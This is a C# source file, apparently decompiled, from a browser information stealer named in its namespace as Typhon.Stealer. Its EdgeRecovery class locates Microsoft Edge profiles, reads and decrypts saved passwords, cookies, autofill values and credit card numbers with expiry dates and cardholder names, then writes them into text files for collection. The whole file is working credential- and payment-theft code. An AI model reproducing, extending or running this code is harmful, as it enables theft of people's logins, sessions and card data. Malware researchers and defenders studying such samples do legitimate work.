using System;
using System.Collections.Generic;
using System.IO;
using Typhon.Modules.Miscellaneous;
using Typhon.Stealer.Software.Browsers.Chromium;

namespace Typhon.Stealer.Software.Browsers.Edge
{
	// Token: 0x02000028 RID: 40
	internal class EdgeRecovery
	{
		// Token: 0x060000AB RID: 171 RVA: 0x00007660 File Offset: 0x00005860
		public static void SaveData(string saveDir)
		{
			string path = Path.Combine(new string[]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + Paths.EdgePath
			});
			if (!Directory.Exists(path))
			{
				return;
			}
			foreach (string str in Directory.GetDirectories(path))
			{
				if (File.Exists(str + "\\Login Data"))
				{
					List<DataModels.CreditCard> cc = EdgeRecovery.GetCC(str + "\\Web Data");
					List<DataModels.AutoFill> af = EdgeRecovery.GetAF(str + "\\Web Data");
					List<DataModels.Password> passwords = ChromiumRecovery.GetPasswords(str + "\\Login Data");
					List<DataModels.Cookie> cookies = ChromiumRecovery.GetCookies(str + "\\Cookies");
					if (!Directory.Exists(saveDir + "\\Credit Cards"))
					{
						Directory.CreateDirectory(saveDir + "\\Credit Cards");
					}
					DataFormatter.WriteCC(cc, saveDir + "\\Credit Cards\\\\CreditCards_(Edge).txt");
					DataFormatter.WritePassword(passwords, saveDir + "\\Passwords.txt", "Edge");
					if (!Directory.Exists(saveDir + "\\Cookies"))
					{
						Directory.CreateDirectory(saveDir + "\\Cookies");
					}
					DataFormatter.WriteCookies(cookies, saveDir + "\\Cookies\\Cookies_(Edge).txt");
					DataFormatter.WriteImportantAutoFills(af, saveDir + "\\ImportantAutoFills.txt", "Edge");
					if (!Directory.Exists(saveDir + "\\Autofills"))
					{
						Directory.CreateDirectory(saveDir + "\\Autofills");
					}
					DataFormatter.WriteAutoFills(af, saveDir + "\\Autofills\\AutoFill_(Edge).txt");
					if (Directory.GetFiles(saveDir + "\\Credit Cards").Length == 0)
					{
						IOHelper.DeleteDirectory(saveDir + "\\Credit Cards", false);
					}
					if (Directory.GetFiles(saveDir + "\\Cookies").Length == 0)
					{
						IOHelper.DeleteDirectory(saveDir + "\\Cookies", false);
					}
					if (Directory.GetFiles(saveDir + "\\Autofills").Length == 0)
					{
						IOHelper.DeleteDirectory(saveDir + "\\Autofills", false);
					}
				}
			}
		}

		// Token: 0x060000AC RID: 172 RVA: 0x00007848 File Offset: 0x00005A48
		private static List<DataModels.AutoFill> GetAF(string sWebData)
		{
			List<DataModels.AutoFill> result;
			try
			{
				List<DataModels.AutoFill> list = new List<DataModels.AutoFill>();
				SQLite sqlite = SqlReader.ReadTable(sWebData, "autofill");
				if (sqlite == null)
				{
					result = list;
				}
				else
				{
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						DataModels.AutoFill item = default(DataModels.AutoFill);
						item.sName = Crypto.GetUTF8(sqlite.GetValue(i, 1));
						item.sValue = Crypto.GetUTF8(Crypto.EasyDecrypt(sWebData, sqlite.GetValue(i, 2)));
						Counter.Autofills++;
						list.Add(item);
					}
					result = list;
				}
			}
			catch
			{
				result = new List<DataModels.AutoFill>();
			}
			return result;
		}

		// Token: 0x060000AD RID: 173 RVA: 0x000078E8 File Offset: 0x00005AE8
		private static List<DataModels.CreditCard> GetCC(string sWebData)
		{
			List<DataModels.CreditCard> result;
			try
			{
				List<DataModels.CreditCard> list = new List<DataModels.CreditCard>();
				if (!File.Exists(sWebData))
				{
					result = list;
				}
				else
				{
					SQLite sqlite = SqlReader.ReadTable(sWebData, "credit_cards");
					if (sqlite == null)
					{
						result = list;
					}
					else
					{
						for (int i = 0; i < sqlite.GetRowCount(); i++)
						{
							DataModels.CreditCard item = default(DataModels.CreditCard);
							item.sNumber = Crypto.GetUTF8(Crypto.EasyDecrypt(sWebData, sqlite.GetValue(i, 4)));
							item.sExpYear = Crypto.GetUTF8(Crypto.EasyDecrypt(sWebData, sqlite.GetValue(i, 3)));
							item.sExpMonth = Crypto.GetUTF8(Crypto.EasyDecrypt(sWebData, sqlite.GetValue(i, 2)));
							item.sName = Crypto.GetUTF8(Crypto.EasyDecrypt(sWebData, sqlite.GetValue(i, 1)));
							Counter.CC++;
							list.Add(item);
						}
						result = list;
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
				result = new List<DataModels.CreditCard>();
			}
			return result;
		}
	}
}
